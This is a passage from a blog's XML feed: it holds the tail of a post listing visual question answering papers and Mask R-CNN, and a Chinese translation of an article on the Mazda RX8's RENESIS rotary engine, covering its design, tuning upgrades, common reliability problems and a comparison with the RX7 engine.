Attention Networks for Image Question Answering. arXiv:1511.02274.<br>• Jin-Hwa Kim, Sang-Woo Lee, Dong-Hyun Kwak, Min-Oh Heo, Jeonghee Kim, Jung-Woo Ha, Byoung-Tak Zhang, Multimodal Residual Learning for Visual QA, arXiv:1606:01455<br>• Hyeonwoo Noh and Bohyung Han, Training Recurrent Answering Units with Joint Loss Minimization for VQA, arXiv:1606.03647<br>• Jin-Hwa Kim, Kyoung Woon On, Jeonghee Kim, Jung-Woo Ha, Byoung-Tak Zhang, Hadamard Product for Low-rank Bilinear Pooling, arXiv:1610.04325. </p>
<h4 id="5-Mask-R-CNN"><a href="#5-Mask-R-CNN" class="headerlink" title="(5) Mask-R-CNN"></a>(5) Mask-R-CNN</h4><p>另外还有一篇是刚刚出来的 Mask RCNN，也是比较火。</p>
<p>文章在这里 <a href="https://arxiv.org/abs/1703.06870">https://arxiv.org/abs/1703.06870</a><br>具体中文讨论在这里 <a href="https://www.zhihu.com/question/57403701">https://www.zhihu.com/question/57403701</a><br>但是，没有代码，我们组也在复现中 </p>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
  </entry>
  <entry>
    <title>关于 MAZDA RX8 转子发动机 —— 您需要了解的所有内容</title>
    <url>/post/rx8-engine/</url>
    <content><![CDATA[<p><code>全文翻译自 https://www.motorverso.com/rx8-engine/</code></p>
<blockquote>
<p>谨以本文，向日本马自达公司的那些工程师们表示敬意，如果没有你们的坚持，这世上会少了一个奇迹。</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/blog_RX8-ENGINE-671x447.jpg"></p>
<span id="more"></span>


<h1 id="0x01-RX8发动机介绍"><a href="#0x01-RX8发动机介绍" class="headerlink" title="0x01. RX8发动机介绍"></a>0x01. RX8发动机介绍</h1><p>自从马自达成立以来，它的转子发动机一直是粉丝的最爱。它被认为是往复活塞发动机的替代品。事实上，到目前为止，它一直是唯一的其他商业合理的发动机类型。诚然，只有马自达相信这一点，因为它是唯一幸存的制造商开发和应用当代转子发动机设计。</p>
<p><img src="http://qiniu.s1nh.org/blog_RX81-710x473.webp"></p>
<p>人们喜欢转子引擎，因为它天生以爱好者为中心的风范。轻巧，简单，和快乐。</p>
<p><img src="http://qiniu.s1nh.org/blog_RX86-710x473.webp" alt="RX8 Engine 13B-MPS Doors Open"></p>
<p>如果马自达没有转子发动机，它就不会获得这么大的粉丝群。任何想要体验转子的人都必须买一辆马自达。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-11-675x450.webp" alt="Mazda Rx8"></p>
<p>13B-MSP（multi-side ports），早在2003年RX8的生产中就已经推出了。人们喜欢这款发动机，它甚至因为其创新的设计和令人惊讶的效率而获得了多个奖项。</p>
<p>在RENESIS人们非常喜欢的一件大事是它的效率。由于是自然吸气式的，它的动力和扭矩都无法与前代车型媲美。然而，为了应对这种情况，马自达首先重新设计了进排气口，减少了重叠，从而提高了发动机的有效压缩比，提高了输出和效率。</p>
<p><img src="http://qiniu.s1nh.org/blog_screenshot.243.webp" alt="RENESIS efficiency RX8 Engine Guide 13B-MSP"></p>
<p>其次，马自达开发了一种低高度棱封来密封转子。这有助于减少摩擦，从而允许更多的功率而不燃烧太多的燃料。</p>
<p>这意味着，虽然转子发动机仅为1.3升，但它产生了相当大的功率。转子发动机的功率从189马力到238马力不等，扭矩为216牛米。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-RX8-Dials.jpg" alt="RX8 Engine Guide 13B-MPS Drivers Dials"></p>
<p>当然，功率输出不是转子发动机的主要焦点。13B-MSP主要目标是解决困扰马自达现有转子发动机的排放问题。他们设法把每加仑18英里和每公里267克的二氧化碳从发动机中抽出来。它并不出色，但至少它应付了国际上日益严格的排放标准。</p>
<p>更重要的是，RX8发动机的改进设计实现了自然吸气设计。RX8并不是RX7的继承者，而是马自达为吸引年轻人而设计的一款新车型。自然吸气的性质使功率输出线性和可预测的。</p>
<p>这也有助于马自达降低RX8的重量。事实证明，这一点很重要，因为即使没有13B-REW的复杂顺序涡轮增压系统，RX8最终仍重达1.3吨。比RX7重100公斤。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-14-675x450.webp" alt="Mazda Rx8"></p>
<p>马自达克服了很多困难，使RX8保持了接近50-50的重量分布。小巧的转子发动机可以安装在前桥之前，从而实现了RX8的前中置发动机布局。对RX8的良好操控特性至关重要。</p>
<p>尽管如此，正是上述马自达对发动机所做的修改让车迷们忧心忡忡。由于缺乏工厂强制进气，发动机设计大不相同，这意味着必须培育一个新的改装市场。</p>
<p>对于大多数转子发动机爱好者来说，13B-REW是一个更容易接近和方便的性能选择。即使到了RENESIS的生命末期，它的改装市场也无法与涡轮增压13B相提并论。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-16-675x448.webp" alt="Mazda Rx8"></p>
<p>话虽如此，但这并不意着MSP没有改进。任何一个转子引擎都因其极富魅力而受到粉丝的喜爱。爱好者们总是很感兴趣地进行实验，看看他们能把发动机推多远。</p>
<h2 id="0x02-MAZDA-13B-MSP-RENESIS-FACTS-AND-STATS"><a href="#0x02-MAZDA-13B-MSP-RENESIS-FACTS-AND-STATS" class="headerlink" title="0x02. MAZDA 13B-MSP (RENESIS) FACTS AND STATS"></a>0x02. MAZDA 13B-MSP (RENESIS) FACTS AND STATS</h2><p>RENESIS有几十种配置。这主要取决于变速器和发动机的用途。事实上，RENESIS的灵活性令人惊讶。</p>
<p><strong>2.1. 4-PORT &amp; 6-PORT</strong></p>
<p>最初，RX8提供了两种不同的功率输出。您可以选择4端口标准输出，或者6端口高输出。功率分别为189马力和237马力。前者配备5速手动和4速自动，后者仅配备6速手动。</p>
<p>值得注意的是，在2006年的RX8车型抛弃了4速自动档。取而代之的是，马自达为发动机设计了一款6速自动换挡拨片，提供212马力。</p>
<p><img src="http://qiniu.s1nh.org/blog_screenshot.239.jpg" alt="13B-MSP output graphs"></p>
<p>所有的RENESIS型号都能产生216牛米的扭矩。值得注意的是，RX8在英国从未提供过自动变型。到2008年改款后，标准功率型号被完全抛弃。这些改款后的RX8被称为 RX8 后期（Series 2, S2）。</p>
<p>2008年的改款在技术上有了很多改进。较短的传动比，加强底盘，并修改了悬架几何结构。此外，发动机在两个壳体上都有第三个喷油口，用于向转子表面中部提供润滑油。</p>
<p><strong>2.2. ELECTRIC METERING OIL PUMP (EMOP)</strong></p>
<p>改款后的 RX8 使用了一个新设计的油泵。随之而来的是润滑系统压力的增加，采用了新的机油滤清器设计。马自达还借此机会开发了一款电动计量油泵（EMOP），取代了现有的机械式计量油泵。这允许更精确的控制来润滑顶点密封。</p>
<p><strong>2.3. CATALYTIC CONVERTER</strong></p>
<p>最关键的是，马自达安装了一个新的催化转化器。它减少了堵塞问题，这是第一代RENESIS的主要疏忽（目前几乎所有的前期 RX8 的三元都堵了）。如果你想要一个RX8的话，就必须坚持使用S2系列。</p>
<p><strong>2.4. EXHAUST PORT DESIGN</strong></p>
<p>马自达在RENESIS的最大变化是它的端口设计。旧的13B-REW具有外围排气口。新的13B-MSP改用侧排气口。这有效地消除了重叠。缺乏重叠改善了排放和低转扭矩。</p>
<p><img src="http://qiniu.s1nh.org/blog_screenshot.242.jpg" alt="Exhaust Ports 13B RX8"></p>
<p>使用侧排气口意味着转子的流量小于发动机的的排气量。马自达通过在每个转子上引入两个排气侧端口来解决这个问题，从而实际上增加了排气口的面积。延迟排气口的打开延长了热膨胀周期，从而提高了热效率。端口设计还保留了一些未燃烧的气体在燃烧室内重新点燃。</p>
<p><img src="http://qiniu.s1nh.org/blog_screenshot.244-675x240.webp" alt="RX8 Exhaust Port"></p>
<p><strong>2.5. INTAKE PORTS</strong></p>
<p>迁移到侧端口在优化进气口方面给予了更多的自由。进气口面积比上一代增加大约30%。马自达还推迟了进气口关闭时间，以考虑更大的进气量。在4端口中，每个转子有2个进气口；在6端口中，有附加的辅助端口。</p>
<p><img src="http://qiniu.s1nh.org/blog_screenshot.241.webp" alt="Intake Port 13b RX8"></p>
<p>为了真正利用改进后的发动机气流，高功率RX8采用了复杂的进气系统。名为顺序动态进气系统（Sequential Dynamic Air Induction System, S-DAIS），这是一个相当复杂的进气歧管设计，以充分利用进入转子的空气。</p>
<p>歧管共有5个阀门，另外还有一个可变新风管（variable fresh air duct）。一个是可变动态进气（Variable Dynamic Intake, VDI）效应，另外4个分别是二次进气阀和辅助进气阀。包括了了5个阶段，如下图所示。</p>
<p><img src="http://qiniu.s1nh.org/blog_intake2-large.jpg" alt="Sequential Dynamic Air Induction System (S-DAIS) 13B RX8"></p>
<p>VDI阀位于四个主要进气流道之间。它仅在 WOT 7250 rpm 以上运行，以方便更快的进气压力充注。通过VDI效应加压并迫使空气进入RX8的发动机。它在4端口中以5750 rpm的转速打开。VDI本质上是延长歧管，以获得更好的中转速扭矩。</p>
<p><img src="http://qiniu.s1nh.org/blog_rotary_intake_manifold3-627x533.webp" alt="VDI RX8 13B-MSP"></p>
<p>有趣的是，额外的可变新鲜空气管道是6端口独有的。当转速为5500转/分时，风道打开，以缩短空气行驶距离。排气侧要简单得多，但马自达设计了高流量，几乎直通式排气系统，以减少流动阻力。</p>
<p><strong>2.6. FLYWHEEL WEIGHT</strong></p>
<p>因为6端口的转速要高得多（8500转/分！）。马自达通过减少材料使每个转子的重量减少了5%。飞轮重量减少了15%。</p>
<p><img src="http://qiniu.s1nh.org/blog_screenshot.237-675x420.webp" alt="13b-msp lightweight rotor"></p>
<p><strong>2.7. INJECTORS</strong></p>
<p>对于转子发动机来说，充足、准确和迅速的供油系统是必不可少的。转子发动机共有6个喷油器，每个转子3个。它们分阶段注入，每个转子有2个主喷油器和1个二次喷油器。然而，后期RX8恢复到4喷油器设计，每个转子有1个主泵和1个次级喷油器。</p>
<p><img src="http://qiniu.s1nh.org/blog_inj5.webp" alt="RENESIS Injectors"></p>
<p><strong>2.8. ELECTRONIC THROTTLE BODY</strong></p>
<p>电子节气门体用于调节节气门开度。以此允许ECU根据路况和驾驶员需求操纵发动机扭矩。每个转子有2个火花塞，用于更完整的燃烧过程。</p>
<p>以上所采取的所有措施都是为了实现更灵敏、更有价值的驾驶体验。有人说转子发动机实际上比他们预期的更适合日常驾驶。这无疑要归功于马自达对日常驾驶性能的优化。</p>
<p>转子发动机最令人印象深刻的方面是它相对简单，转子发动机及其所有辅助设备的重量只有112公斤，推重比还算不错。</p>
<p><img src="http://qiniu.s1nh.org/blog_screenshot.238.jpg" alt="TECHNICAL DATA (PRE-FACELIFT)"></p>
<h2 id="0x03-13B-MSP-RX8-ENGINE-TUNING-amp-UPGRADES"><a href="#0x03-13B-MSP-RX8-ENGINE-TUNING-amp-UPGRADES" class="headerlink" title="0x03. 13B-MSP RX8 ENGINE TUNING &amp; UPGRADES"></a>0x03. 13B-MSP RX8 ENGINE TUNING &amp; UPGRADES</h2><p>如果你不能清晰的了解后果的话，通常建议你不要试图修改你的RX8引擎。RENESIS即使在原厂的情况下也是一款性能强大的发动机，并且在可靠性和性能之间提供了一种平衡。</p>
<p>你可能会问为什么转子发动机不像传统的日本跑车一样，有众多的改装件。因为它的修改成本非常高，同时提供的回报也比同类产品少。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-7-675x450.webp" alt="Mazda Rx8 7"></p>
<p>在自然吸气的发动机中，马自达已经对转子发动机的动力提升中做了一个令人难以置信的工作。在改装之前，你必须彻底研究你要做的mods，我在这里只是为你提供一些可选的方案。</p>
<p><strong>3.1. PERFORMANCE INTAKE</strong></p>
<p>大多数人开始从进气系统开始改装自己的车。但是马自达在RX8的进气系统研发上花了很大精力，改装进气系统未必有用。</p>
<p>普遍认为RX8原厂的进气系统是一流的。只有AEM和Mazdaspeed的冷进气值得改装。</p>
<p>AEM冷进气系统约400美元（在中国零售大约2500）。它将空气入口重新定位到散热器前面的保险杠上。AEM报告说，在约7000转/分的转速下，它们的冷空气进气又增加了8马力。</p>
<p>导致大多数改装进气降低功率的原因是由于空气流量传感器的位置。原厂进气的前端有一个网筛，可以保证空气笔直进入 <em>（has a straight flow into the MAF sensor with a mesh screen in front for laminar flow）</em> ，以保证空气流量计有一个准确的度数。大多数改装的进气没有这个网筛，它会导致空气流量传感器提供低于标准的读数，因此电子控制单元提供不准确的燃油和点火正时。</p>
<p>另一款进气是 Racing Beat REVi。它的设计比原厂增加了很多进气的噪音。价格和AEM系统差不多。在红线附近，预期可以增加5-6马力。</p>
<p>改装进气一个重要的原因是增加进气噪音。此外，当你抛弃笨重的原厂进气风箱后，机舱有更大的空间方便维修。</p>
<p>K&amp;N风格式过滤器与原厂过滤器相比没有什么改进，它的过滤能力可能也不如原厂过滤器。有国外的案例，KN风格会破损导致异物吸入发动机，不推荐。</p>
<p><strong>3.2. PERFORMANCE EXHAUST</strong></p>
<p>如果你想获得更多的动力，最简单的是改装排气管。在RX8中，主要的排气阻塞点位于排气中段（三元段）的是三元催化转化器。其它排气系统的流量足以达到预期的输出。请注意，更换中段时请不含三元催化转化器。非原厂的三元催化不能够在转子发动机使用（包括芒果三元）。如果你必须使用三元，你只能使用原厂三元催化。</p>
<p>如果你想得到一个排气声音，可以更换长头段。</p>
<p>如果你想保持原厂的供油和排气（保留三元催化），可以换一个不锈钢头段。虽然不会提升功率，但它的重量远远小于原厂头段。</p>
<p>对于排气后段，更多的是个人喜好，你得自己研究看哪一个更适合你的口味。</p>
<p><strong>3.3. ECU TUNING</strong></p>
<p>一旦你修改了进气和排气，可以适当调整ECU来获得更大的马力。</p>
<p>在保留原厂ECU的情况下（不使用全取代电脑），有两个软件可以调整RX8。MazdaEdit 和 VersaTuner 都适用于S1和S2 RX8。外挂电脑等试图“欺骗”ECU的方法是不够的。原厂ECU会发现问题并进行调整。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-10-675x349.webp" alt="Mazda Rx8 10"></p>
<p>COBB AcessPORT 在过去是可行的，但现在他们已经放弃支持任何自然吸气汽车。它也只适用于前期 ECU。</p>
<p>一定要找到会刷ECU的转子大佬，告诉他你对车子改装了哪些部分。价格取决于你的地区和你的调整方法。一般来说，您可以获得约10马力的增益，这取决于您的RX8的改装。</p>
<p><strong>3.4. MISCELLANEOUS MODS</strong></p>
<p>还有一些改装根本不会影响发动机输出，但可以提供更具运动感的驾驶体验。如果你想用最小的缺点来改善发动机的响应，那么轻量化的飞轮就是一个不错的选择。</p>
<p>改变飞轮重量时，会影响传动系的惯性平衡。转动的重量越轻，发动机就越容易转动。然而，动量也减少了。所以你的发动机转速会更快地降低。这显著地改善了发动机的驾驶感觉。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-RX8-from-Unsplash-Itwasso.webp"></p>
<p>然而，在某些情况下，惯性越大越好。更大的惯性实际上可以使汽车更容易驾驶。如果飞轮变轻，陡坡的影响会更加明显，半坡起步会比较麻烦。可以通过更熟练地使用离合器来解决这些问题，但是你可能会因此而对离合器造成更大的磨损。</p>
<p>不太推荐减轻皮带轮的重量，转换为轻型铝皮带轮通常是无关紧要的。<!--而欠载您的辅助设备有自己的不利影响。空调压缩机是一个你可以负担得起的驱动不足。这是一个主要的寄生排水管，即使在驱动不足，你仍然有空调，只是不有效。--></p>
<p>由于带有偏心轴的双转子发动机的特性，主皮带轮在出厂时也非常轻。因此，没有必要更换它。</p>
<h2 id="0x04-BIG-POWER"><a href="#0x04-BIG-POWER" class="headerlink" title="0x04. BIG POWER"></a>0x04. BIG POWER</h2><p>这是一个庞大的话题，它本身就值得一篇文章。如果你热衷于涡轮增压套件，甚至氮气，请先仔细查阅资料。如果你想交换你的RX8引擎，我们也有一个指南。很多人选择的LS引擎交换，请详细的阅读我们的指南。</p>
<p>也有port转子的方法来增加引擎输出，即增加进气孔大小。即使现在port的方法大多是实验性的。Racing Beat 为引擎提供了一个port模板用于DIY。如果你想做得好，有专业的数控加工方法。此外，还可以进行bridge。</p>
<h2 id="0x05-RX8-ENGINE-RELIABILITY-amp-COMMON-PROBLEMS"><a href="#0x05-RX8-ENGINE-RELIABILITY-amp-COMMON-PROBLEMS" class="headerlink" title="0x05. RX8 ENGINE RELIABILITY &amp; COMMON PROBLEMS"></a>0x05. RX8 ENGINE RELIABILITY &amp; COMMON PROBLEMS</h2><p>转子发动机本身是相当可靠的。然而，它的一些主要设计疏忽，会导致一些莫名其妙的不可靠。</p>
<p>如果你打算跑完10万英里，准备好进行细致的预防性维护。毕竟，虽然RX8是一款经济实惠的车，但它仍然是一款跑车。跑车往往要求车主给予更多的关注。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-5-675x484.webp" alt="Mazda Rx8 5"></p>
<p>早期的RX8由于转子内注油不足而迅速声名狼藉。这加速了磨损并导致发动机过早故障。可以通过刷ECU来解决这个问题。</p>
<p><strong>5.1. IGNITION COILS</strong></p>
<p>早期，人们不知道RENESIS的点火线圈多久会失灵一次。4个插头有4个线圈，但是在转子发动机中，这些线圈每转都会燃烧3次。因此在转子发动机中点火线圈通常不够耐用。</p>
<p><strong>5.2. COMPRESSION</strong></p>
<p>但是，这些线圈故障经常被误诊，经销商往往在保修期内更换发动机。这些所谓的“死”发动机，会被重建（rebuild）成翻新发动机（remanufactured），他们通常品控很差，并且会出现问题。所以现在前期的RX8可能会收到这种有很大问题的发动机，因此他们认为转子发动机不可靠。</p>
<p>因此，建议在购买RX8之前，先做一个缸压测试。来快速的确定发动机的健康状况。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-9-675x334.webp" alt="Mazda Rx8 9"></p>
<p><strong>5.3. OIL – 3,000 MILES PER CHANGE</strong></p>
<p>除此之外，RENESIS只是一个需要大量维护和关注才能可靠的引擎。最重要的是，使用高质量的机油。虽然全合成是没有必要的，不过，频繁换油要重要得多，大多数车主建议每次换油行驶3000英里（约5k公里）左右。转子燃烧机油来润滑其众多的转子密封件，因此始终为发动机提供新鲜机油是至关重要的。</p>
<p><strong>5.4. FUEL FLOODING</strong></p>
<p>此外，RENESIS也很容易发生燃油泛滥。这通常是由于薄弱的电气部件导致发动机盘车不够快。因此，燃油迅速积聚并冲出转子。薄弱的点火元件是常见的罪魁祸首，所以每隔30000英里（约5万公里）更换一次点火线圈、缸线和火花塞。它们可能会在3万英里以内损坏，尽管这很罕见。</p>
<p><img src="http://qiniu.s1nh.org/blog_Starting-a-flooded-mazda-RX8-7_1000x750-675x506.webp" alt="Starting a flooded mazda RX8 7 1000x750"></p>
<p><strong>5.5. COOLING</strong></p>
<p>充分的冷却是绝对必要的。这是一台能产生大量热量的发动机。任何冷却系统部件故障都可能导致发动机快速故障。在发动机过热（~115C）之前，库存仪表组冷却液温度指针不会移动到中间。一种简单又便宜的方法是，买一个OBD2仪表来更准确地监测你的发动机。</p>
<p><img src="http://qiniu.s1nh.org/blog_Starting-a-flooded-mazda-RX8-7_1000x750-675x506.webp" alt="Starting a flooded mazda RX8 8 1000x750"></p>
<p>建议您使用马自达FL-22冷却液，每2年或每60000英里冲洗一次。否则，每年进行冷却液冲洗。及时冲洗冷却液可延长部件寿命。不管怎样，他们都会随着时间的推移而失效。自动调温器经常失灵，价格在70美元左右。建议调高78摄氏度的自动调温器。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-RX8-from-Unsplash-tetrakiss-675x379.webp"></p>
<p><strong>5.6. CATALYTIC CONVERTER</strong></p>
<p>另一个重要的故障点是三元催化转化器（cat）。糟糕的点火系统会将未燃烧的燃油喷入cat，这会很快堵塞cat。堵塞的cat导致热量向上游扩散。这可能导致氧传感器故障、转子密封老化、机油加速磨损、冷却系统工作过度。</p>
<p>综上所述，如果你继续保持你的RX8的维护，RENESIS可以证明是相当强大的。也就是说，您一定要通读这个部分，以便真正掌握整个RX8的使用体验。</p>
<h2 id="0x06-RX8-ENGINE-VS-RX7-ENGINE"><a href="#0x06-RX8-ENGINE-VS-RX7-ENGINE" class="headerlink" title="0x06. RX8 ENGINE VS RX7 ENGINE"></a>0x06. RX8 ENGINE VS RX7 ENGINE</h2><p>如果你读过这篇文章，你应该已经知道 13B-MSP(RX8) 和 13B-REW(RX7) 的区别了。事实上，尽管是在同一个家庭，这两个引擎是截然不同的。因此，将13B-REW 移植到 RX8 并不像您想象的那么简单。</p>
<p>首先，两种发动机的排气和进气系统有很大的不同。喷油不同。转子密封方法不同。转子外壳尺寸不同。这两台发动机的大部分零件不是共用的。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-6-675x354.webp" alt="Mazda Rx8 6"></p>
<p>一般来说，13B-REW 被认为是一个更强大，品质更好的发动机。为了保持重量最小，马自达做了很多设计的问题。首先，顶点密封件更薄更小，外壳质量最多也令人怀疑。</p>
<p>由于13B-REW采用涡轮增压，马自达设计的发动机能够承受更大的燃烧压力。但即使作为一个NA引擎，它的输出也与13B-REW相当。</p>
<p><img src="http://qiniu.s1nh.org/blog_Mazda-Rx8-14-675x450.webp" alt="Mazda Rx8 14"></p>
<p>事实是，这两代人都有自己的问题，包括R3的公平份额。复杂的顺序涡轮引入了几十个真空软管，如果忽视这些软管，可能会导致涡轮相关的问题。而且13b-msp的大部分维护工作也适用于13B-REW。</p>
<p>如果你想要一个愉快的，线性的性能和一点改装，RENESIS是理想的。然而，如果你喜欢一个奖励的感觉，涡轮增压发动机的功率阶段，13B-REW的建议。13B-REW也更有利于大功率MOD。</p>
<h2 id="0xFF-RX8-ENGINE-CONCLUSION"><a href="#0xFF-RX8-ENGINE-CONCLUSION" class="headerlink" title="0xFF. RX8 ENGINE CONCLUSION"></a>0xFF. RX8 ENGINE CONCLUSION</h2><p>RENESIS经常被不公平地认为是一个有缺陷的发动机，受到可靠性问题的困扰。然而，大多数可靠性问题都是由于早期的设计缺陷和无知造成的，而这些缺陷和无知给RX8带来了可悲的负面耻辱。</p>
<p><img src="http://qiniu.s1nh.org/blog_RX84-710x473.webp" alt="13B-MSP Inside"></p>
<p>如果你对待你的RX8像一辆跑车一样提供维护，那么它是一个令人惊讶的品质优良且有充足动力的汽车。而且 RX8 价格不高，所以它是你踏入跑车圈子的第一步。</p>
]]></content>
      <categories>
        <category>赛车</category>
      </categories>
      <tags>
        <tag>rx8</tag>
        <tag>转子发动机</tag>
      </tags>
  </entry>
</search>
